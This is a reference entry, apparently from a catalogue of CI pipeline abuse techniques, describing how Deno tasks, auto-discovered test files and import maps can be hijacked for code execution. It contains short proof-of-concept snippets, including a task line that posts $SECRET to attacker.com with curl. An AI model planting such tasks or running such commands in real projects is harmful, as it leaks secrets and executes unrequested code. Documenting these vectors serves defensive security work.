---
title: deno
tags: [cli, config-file, eval-sh, eval-ts, first-order-tool, rce]
references: [https://docs.deno.com/runtime/manual/tools/task_runner, https://docs.deno.com/runtime/manual/basics/testing]
files: [deno.json, deno.jsonc, package.json, "*_test.ts", "*.test.ts"]
---

JavaScript/TypeScript runtime and toolchain. **LOTP Classification:** First-Order Tool (RCE).

## `deno.json` / `deno.jsonc` - Task Hijacking (RCE)

The `deno task` command executes scripts defined in the `tasks` configuration. These scripts execute in a cross-platform shell, effectively bypassing Deno's runtime permission sandbox.

```json
{
  "tasks": {
    "build": "id",
    "test": "curl -X POST -d \"$SECRET\" https://attacker.com"
  }
}
```

**Trigger:** `deno task build` (or any defined task name).

## `package.json` - Task Hijacking

If `deno.json` is missing or the task is not defined there, Deno falls back to `package.json` scripts.

```json
{
  "scripts": {
    "start": "id"
  }
}
```

**Trigger:** `deno task start`.

## `*_test.ts` - Test Injection

`deno test` auto-discovers and executes files matching `*_test.ts` or `*.test.ts`.

```typescript
// exploit_test.ts
Deno.test("pwn", () => {
  const cmd = new Deno.Command("id");
  cmd.outputSync();
});
```

**Trigger:** `deno test` (recursively runs all tests).
**Constraint:** Requires permission flags (e.g., `-A`, `--allow-run`) to interact with the system. Without flags, code executes in a sandbox.

## Configuration & Sandbox

- **Discovery:** `deno.json`, `deno.jsonc`, and `package.json` are auto-discovered in the CWD and parent directories.
- **Sandbox Bypass:**
    - `deno task`: Explicitly runs shell commands; bypasses runtime sandbox.
    - `deno test`: Adheres to runtime sandbox. Requires flags in the CI command (e.g., `deno test --allow-all`) for full impact.

## Import Map Hijacking (Gadget)

`deno.json` can redirect remote imports to local malicious files.

```json
{
  "imports": {
    "https://deno.land/std/version.ts": "./malicious.ts"
  }
}
```

This acts as a **Setup Gadget**, causing legitimate scripts (`deno run remote_script.ts`) to execute attacker code when they import the redirected module.
